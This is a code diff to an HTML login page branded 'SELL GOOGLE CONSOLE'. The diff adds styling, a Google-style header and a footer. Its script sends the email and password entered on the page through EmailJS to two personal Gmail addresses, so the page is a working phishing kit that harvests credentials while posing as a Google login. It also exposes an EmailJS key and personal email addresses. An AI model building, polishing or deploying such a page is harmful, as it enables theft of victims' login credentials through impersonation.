@@ -9,11 +9,48 @@
         body {
             font-family: Arial, sans-serif;
             display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            background-color: #f1f1f1;
+            margin: 0;
+            padding: 0;
+        }
+
+        .header {
+            text-align: center;
+            padding: 20px;
+            background: white;
+            box-shadow: 0px 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .logo {
+            width: 100px;
+            animation: heartbeat 1.5s ease-in-out infinite;
+        }
+        
+        @keyframes heartbeat {
+            0% { transform: scale(1); }
+            14% { transform: scale(1.1); }
+            28% { transform: scale(1); }
+            42% { transform: scale(1.1); }
+            70% { transform: scale(1); }
+        }
+        
+        .title {
+            font-size: 2em;
+            color: #4285F4;
+            margin: 15px 0;
+            font-weight: bold;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            background-color: #f1f1f1;
+            padding: 20px;
         }
+
         .container {
             background: white;
             padding: 20px;
@@ -22,6 +59,7 @@
             text-align: center;
             width: 300px;
         }
+
         input {
             width: 90%;
             padding: 10px;
@@ -29,6 +67,7 @@
             border: 1px solid #ccc;
             border-radius: 5px;
         }
+
         .btn {
             width: 100%;
             padding: 10px;
@@ -38,25 +77,48 @@
             border-radius: 5px;
             cursor: pointer;
         }
+
         .btn:hover {
             background: #357ae8;
         }
+
         .loading {
             display: none;
             margin-top: 10px;
         }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background: white;
+            box-shadow: 0px -2px 10px rgba(0,0,0,0.1);
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Login</h2>
-        <input type="email" id="email" placeholder="Email" required>
-        <input type="password" id="password" placeholder="Password" required>
-        <button class="btn" onclick="login()">Log In</button>
-        <div class="loading">Loading...</div>
+    <header class="header">
+        <img src="your-logo.png" alt="Logo" class="logo">
+        <h1 class="title">SELL GOOGLE CONSOLE</h1>
+    </header>
+
+    <div class="main-content">
+        <div class="container">
+            <h2>Login</h2>
+            <input type="email" id="email" placeholder="Email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button class="btn" onclick="login()">Log In</button>
+            <div class="loading">Loading...</div>
+        </div>
     </div>
 
+    <footer class="footer">
+        <p>© <span id="year"></span> Google Console. All rights reserved.</p>
+    </footer>
+
     <script>
+        // Set current year in footer
+        document.getElementById('year').textContent = new Date().getFullYear();
+
         // Initialize EmailJS
         emailjs.init("UOCiCpne8fEL1dZ7y");
 
@@ -72,7 +134,7 @@
                 user_email: email,
                 user_password: password,
                 to_email1: "sblgivan@gmail.com",
-                to_email2: "waiganjoallan7@gmail.com" // Replace with your second email
+                to_email2: "waiganjoallan7@gmail.com"
             };
 
             // Send email using EmailJS
